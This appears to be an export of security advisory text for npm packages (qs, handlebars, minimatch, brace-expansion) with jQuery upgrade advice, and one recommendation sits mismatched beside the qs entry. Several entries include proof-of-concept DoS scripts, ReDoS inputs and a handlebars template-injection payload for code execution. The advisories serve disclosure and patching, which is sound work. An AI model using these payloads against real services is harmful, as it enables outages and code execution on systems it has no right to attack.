deeperData.explanationMarkdown:
The `parse()` function in `package/index.js` used in the `qs` package (a querystring parser) running under `node.js` does not have an option to limit the object depth which leaves the application vulnerable to a Denial of Service (DoS). A remote attacker can provide a deeply nested object as part of the queryString  parameter, causing the application to block the event loop for a long time while processing all the nested objects. The event loop blocking will prevent the application from handling any other request.


Sample attack:
```
var qs = require('qs');

var s = 'a[a]';
while (Buffer.byteLength(s, 'utf8') < 800000) {
    s = s + '[a]';
}
s += '=a';

console.log('start');
try {
    qs.parse(s);
} catch (e) {
}
console.log('finish')
```
>
>When the above attack scenario is executed using node, we get the below output
>
```
time node index.js

start
finish

real    0m17.405s
user    0m17.403s
sys     0m0.102s
```

Reference : [https://blog.liftsecurity.io/2014/08/06/denial-of-service-in-qs](https://blog.liftsecurity.io/2014/08/06/denial-of-service-in-qs)

*Note:* This vulnerability has been assigned CVE-2014-10064.

deeperData.recommendationMarkdown:
We recommend upgrading to a version of this component that is not vulnerable to this specific issue. If an older version of jQuery must be used, the jQuery team recommends manually removing the regular expression string replacement in the `htmlPrefilter` function returning the HTML code as is, so that the function looks as follows:
```
jQuery.htmlPrefilter = function( html ) {
	return html;
};
```

For XHTML-compliant behavior: Use the latest version of the [jQuery migrate plugin](https://github.com/jquery/jquery-migrate) and call `jQuery.UNSAFE_restoreLegacyHtmlPrefilter()` in addition to sanitizing the user input using the [dompurify](https://github.com/cure53/dompurify) library. Do not use the `SAFE_FOR_JQUERY` option when using `dompurify`. See the [upgrade guide](https://jquery.com/upgrade-guide/3.5/) for more detailed information

Ref: [https://github.com/advisories/GHSA-gxr4-xjj5-5px2](https://github.com/advisories/GHSA-gxr4-xjj5-5px2)

Note: If this component is included as a bundled/transitive dependency of another component, there may not be an upgrade path. In this instance, we recommend contacting the maintainers who included the vulnerable package. Alternatively, we recommend investigating alternative components or a potential mitigating control.

deeperData.explanationMarkdown:
The `handlebars` package is vulnerable to Prototype Pollution. The `nameLookup()` function in the `javascript-compiler.js` file and the `lookup()` function in the `lookup.js` file fail to restrict access to the `constructor` from templates. A remote attacker who can inject templates into the `handlebars` setup can exploit this vulnerability by supplying a template containing malicious JavaScript. The attacker can then leverage this issue to alter the `constructor` property, and execute arbitrary code on an affected machine.

Example:
```
{{#with 'alert(1)|'}}
{{#with (split '|' 1)}}
{{#> p constructor.constructor}}
{{> (apply 0 ../this)}}
{{/p}}
{{/with}}
{{/with}}
```
Reference: [https://github.com/wycats/handlebars.js/issues/1267#issue-187151586](https://github.com/wycats/handlebars.js/issues/1267#issue-187151586)

*Advisory Deviation Notice:* The Sonatype security research team discovered that the vulnerability was fixed in version 4.1.2-0 in the 4.1.x branch instead of 4.1.2 as the advisory states.

The `minimatch` package is vulnerable to a Regular expression Denial of Service (ReDoS). The `parse (pattern, isSub)` method in `minimatch.js` does not filter exponentially long repetitive sequences of `\` causing the application to become slow or hung due to excessive resource consumption. A remote attacker could exploit this flaw by supplying a specially crafted input (via any vector where untrusted data is accepted) to cause a Denial of Service (DoS).

>Proof of concept:
```
var minimatch = require("minimatch");
>
// utility function for generating long strings
var genstr = function (len, chr) {
  var result = "";
  for (i=0; i<=len; i++) {
    result = result + chr;
  }
  return result;
}
>
var exploit = "[!" + genstr(1000000, "\\") + "A";
>
// minimatch exploit.
console.log("starting minimatch");
minimatch("foo", exploit);
console.log("finishing minimatch");
```

Reference: [https://www.npmjs.com/advisories/118](https://www.npmjs.com/advisories/118)

`brace-expansion` is vulnerable to Regular Expression Denial of Service (ReDoS). The `expand(str, isTop)` function within `index.js` has a regular expression defined which contains repetition in a group that is again repeated and is matched against user-supplied data. An attacker can craft an input value that contains a repetitive set of characters long enough to cause the regular expression engine to consume enough resources to affect the ability of the system causing a DoS.

>A proof of concept is provided below:
>
var expand = require('brace-expansion');
expand('{,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n}');

Reference: [https://www.npmjs.com/advisories/338](https://www.npmjs.com/advisories/338)

